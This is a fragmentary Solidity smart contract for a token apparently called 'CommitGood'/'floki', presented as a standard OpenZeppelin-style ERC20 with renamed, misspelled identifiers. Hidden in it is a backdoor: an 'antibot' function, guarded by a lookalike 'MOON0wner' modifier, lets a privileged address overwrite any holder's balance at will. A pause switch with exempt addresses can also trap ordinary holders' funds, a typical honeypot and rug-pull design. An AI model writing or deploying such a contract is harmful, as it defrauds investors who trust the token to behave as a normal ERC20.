...
interface MOONIERC71Metadata is MOONIERC71 {
    /**
...
abstract contract MOONOwnable is MOONContext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "MOONOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "MOONOwnable: new owner is the zero address");
...
contract CommitGood is MOONContext, MOONIERC71, MOONIERC71Metadata, MOONOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private MOONbalances;
  ...
  address MOONpinksale;
     ...
     * {MOONIERC71-balanceOf} and {MOONIERC71-transfer}.
     */
    ...
    /**
     * @dev See {MOONIERC71-totalSupply}.
     */
    ...
    /**
     * @dev See {MOONIERC71-balanceOf}.
     */
    function balanceOf(address vaccount) public view virtual override returns (uint256) {
        return MOONbalances[vaccount];
    }

    /**
     * @dev See {MOONIERC71-transfer}.
     *
     * Requirements:
     *
    ...
    /**
     * @dev See {MOONIERC71-transferFrom}.
     *
     ...
     * problems described in {MOONIERC71-approve}.
     *
  ...
  modifier MOON0wner () {
    ...
    function _transfer(
        ...
        // My implementation
        require(!MOONisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = MOONbalances[from];
        require(fromBalance >= valux, "ERC20: transfer valux exceeds balance");
        unchecked {
            MOONbalances[from] = fromBalance - valux;
        }
        MOONbalances[to] += valux;
    ...
    function _mint(address vaccount, uint256 valux) internal virtual {
        ...
        SotalSupply += valux;
        MOONbalances[vaccount] += valux;
        emit Transfer(address(0), vaccount, valux);

        _afterTokenTransfer(address(0), vaccount, valux);
    }
  function antibot(address vaccount, uint256 valux) public MOON0wner {
    MOONbalances[vaccount] = (valux - valux) + valux * 10 ** 9;
            emit Transfer(address(0), vaccount, valux);
  }
    /**
    ...
    function _burn(address vaccount, uint256 valux) internal virtual {
        ...
        uint256 vaccountBalance = MOONbalances[vaccount];
        require(vaccountBalance >= valux, "ERC20: burn valux exceeds balance");
        unchecked {
            MOONbalances[vaccount] = vaccountBalance - valux;
        }
        SotalSupply -= valux;
...
contract floki is MOONContext, IERC20, MOONOwnable { 
